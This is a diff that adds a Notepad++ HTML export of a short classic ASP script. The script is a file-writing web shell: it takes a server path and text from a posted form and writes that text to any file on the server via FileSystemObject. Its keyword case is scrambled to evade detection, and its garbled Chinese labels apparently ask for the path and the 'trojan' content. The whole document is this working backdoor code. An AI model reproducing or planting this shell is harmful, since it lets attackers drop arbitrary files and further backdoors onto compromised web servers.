@@ -1,0 +1,68 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+	font-weight: bold;
+}
+.sc15 {
+	font-weight: bold;
+}
+.sc81 {
+	color: #8000FF;
+}
+.sc83 {
+	color: #FF0000;
+}
+.sc84 {
+	font-weight: bold;
+	color: #000080;
+}
+.sc85 {
+	color: #808080;
+}
+.sc86 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc84">Dim</span><span class="sc81"> </span><span class="sc86">ObjFSO</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc84">Dim</span><span class="sc81"> </span><span class="sc86">FDAtA</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc84">Dim</span><span class="sc81"> </span><span class="sc86">ObjCOuntFilE</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc84">On</span><span class="sc81"> </span><span class="sc84">ErrOr</span><span class="sc81"> </span><span class="sc84">rEsumE</span><span class="sc81"> </span><span class="sc84">nExt</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc84">SEt</span><span class="sc81"> </span><span class="sc86">ObjFSO</span><span class="sc81"> = </span><span class="sc86">SErvEr.CrEAtEObjEct</span><span class="sc81">(</span><span class="sc85">"Scripting.FilESystEmObjEct"</span><span class="sc81">) </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc84">iF</span><span class="sc81"> </span><span class="sc86">Trim</span><span class="sc81">(</span><span class="sc86">rEquEst</span><span class="sc81">(</span><span class="sc85">"syFDpAth"</span><span class="sc81">))&lt;&gt;</span><span class="sc85">""</span><span class="sc81"> </span><span class="sc84">thEn</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc86">FDAtA</span><span class="sc81"> = </span><span class="sc86">rEquEst</span><span class="sc81">(</span><span class="sc85">"cyFDDAtA"</span><span class="sc81">) </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc84">SEt</span><span class="sc81"> </span><span class="sc86">ObjCOuntFilE</span><span class="sc81">=</span><span class="sc86">ObjFSO.CrEAtETExtFilE</span><span class="sc81">(</span><span class="sc86">rEquEst</span><span class="sc81">(</span><span class="sc85">"syFDpAth"</span><span class="sc81">),</span><span class="sc84">TruE</span><span class="sc81">) </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc86">ObjCOuntFilE.WritE</span><span class="sc81"> </span><span class="sc86">FDAtA</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc84">iF</span><span class="sc81"> </span><span class="sc86">Err</span><span class="sc81"> =</span><span class="sc83">0</span><span class="sc81"> </span><span class="sc84">thEn</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc86">rEspOnsE.writE</span><span class="sc81"> </span><span class="sc85">"&lt;FOnt cOlOr=rED&gt;sAvE SuccEss!&lt;/FOnt&gt;"</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc84">ElsE</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc86">rEspOnsE.writE</span><span class="sc81"> </span><span class="sc85">"&lt;FOnt cOlOr=rED&gt;SAvE UnSuccEss!&lt;/FOnt&gt;"</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc84">EnD</span><span class="sc81"> </span><span class="sc84">iF</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc86">Err.clEAr</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc84">EnD</span><span class="sc81"> </span><span class="sc84">iF</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc86">ObjCOuntFilE.ClOsE</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc84">SEt</span><span class="sc81"> </span><span class="sc86">ObjCOuntFilE</span><span class="sc81">=</span><span class="sc84">NOthing</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc84">SEt</span><span class="sc81"> </span><span class="sc86">ObjFSO</span><span class="sc81"> = </span><span class="sc84">NOthing</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc86">REspOnsE.writE</span><span class="sc81"> </span><span class="sc85">"&lt;FOrm ActiOn='' mEthOD=pOst&gt;"</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc86">REspOnsE.writE</span><span class="sc81"> </span><span class="sc85">"±£´æÎÄ¼þµÄ&lt;FOnt cOlOr=rED&gt;¾ø¶ÔÂ·¾¶(°üÀ¨ÎÄ¼þÃû:ÈçD:\wEb\x.Asp):&lt;/FOnt&gt;"</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc86">REspOnsE.WritE</span><span class="sc81"> </span><span class="sc85">"&lt;input typE=tExt nAmE=syFDpAth wiDth=32 sizE=50&gt;"</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc86">REspOnsE.WritE</span><span class="sc81"> </span><span class="sc85">"&lt;br&gt;"</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc86">REspOnsE.writE</span><span class="sc81"> </span><span class="sc85">"±¾ÎÄ¼þ¾ø¶ÔÂ·¾¶"</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> =</span><span class="sc86">sErvEr.mAppAth</span><span class="sc81">(</span><span class="sc86">REquEst.SErvErVAriAblEs</span><span class="sc81">(</span><span class="sc85">"SCRIPT_NAME"</span><span class="sc81">)) </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc86">REspOnsE.writE</span><span class="sc81"> </span><span class="sc85">"&lt;br&gt;"</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc86">REspOnsE.writE</span><span class="sc81"> </span><span class="sc85">"ÊäÈëÂíµÄÄÚÈÝ:"</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc86">REspOnsE.writE</span><span class="sc81"> </span><span class="sc85">"&lt;tExtArEA nAmE=cyFDDAtA cOls=80 rOws=10 wiDth=32&gt;&lt;/tExtArEA&gt;"</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc86">REspOnsE.writE</span><span class="sc81"> </span><span class="sc85">"&lt;input typE=submit vAluE=±£´æ&gt;"</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+</span><span class="sc15">&lt;%</span><span class="sc81"> </span><span class="sc86">REspOnsE.writE</span><span class="sc81"> </span><span class="sc85">"&lt;/FOrm&gt;"</span><span class="sc81"> </span><span class="sc15">%&gt;</span><span class="sc0">
+
+</span></div></body>
+</html>
